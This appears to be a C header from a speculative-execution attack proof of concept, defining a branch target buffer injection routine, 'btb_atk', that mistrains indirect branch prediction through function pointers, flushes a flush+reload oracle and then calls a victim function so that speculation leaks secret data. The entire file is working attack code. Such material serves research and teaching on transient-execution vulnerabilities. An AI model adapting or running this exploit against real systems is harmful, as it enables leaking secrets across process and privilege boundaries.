#ifndef _BTB_
#define _BTB_

#include "../defines.h"
#include "../sidechannel/flush_reload.h"

extern char* oracle_block; // external reference to sidechannel's oracle block
extern int junk; // junk variable used during attack 
extern int (*fp1)(char *info); // first function pointer
extern int (**fp2)(char *info); // pointer to first function pointer

int attacker(char *info); // attacker function
int safe(); // "safe" function that does nothing relevant
int victim(char *info, int input); // base victim function

// btb attack
static inline void btb_atk(char *info){
    static char trash = '#'; // trash character used to train victim function
    static int i; // counts iterations during training


    _mm_mfence();
    // set function pointers for first stage
    fp1 = &attacker;
    fp2 = &fp1;

    _mm_mfence();
    // training segment
    for (i = 0; i < 50; i++){
        junk ^= victim(&trash,0);
    }

    _mm_mfence();
    // flush sidechannel, eliminating trash character
    flush(oracle_block, PAGESIZE);
    _mm_mfence();
    // set function pointers for second stage

    fp1 = &safe;
    fp2 = &fp1;
    _mm_mfence();

    // flush function pointers
    _mm_clflush((void*)fp1);
    _mm_clflush((void*)fp2);
    _mm_mfence();
    // call victim with malicious information
    junk ^= victim(info,0);
};



#endif